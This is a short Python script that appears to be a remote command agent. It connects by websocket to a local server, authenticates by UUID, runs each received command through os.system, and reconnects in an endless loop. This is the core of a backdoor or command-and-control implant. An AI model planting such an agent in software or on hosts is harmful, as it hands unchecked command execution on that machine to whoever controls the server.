import websockets
import asyncio
import json
import os
import traceback

debugMode = True


def debug(*args):
    if debugMode:
        print(*args)


UUID = "91ba9cdb-0607-42bf-b200-8eb0b6a02e2b"

WS_URL = f"ws://127.0.0.1:8000/agent/{UUID}/ws"


async def main():
    while True:
        try:
            async with websockets.connect(WS_URL) as ws:
                # Wait for authentication
                res = await ws.recv()
                res = json.loads(res)
                debug(res)
                if res.get("status") != '200':
                    raise Exception("Authentication failed")

                while True:
                    res = await ws.recv()
                    res = json.loads(res)
                    debug("recv: " + str(res))

                    output = os.system(res.get("command"))
                    debug(output)

                    # await ws.send(json.dumps({
                    #     "status": 200,
                    #     "output": output
                    # }))

        except Exception as e:
            debug(traceback.format_exc())
            await asyncio.sleep(5)

while True:
    asyncio.run(main())
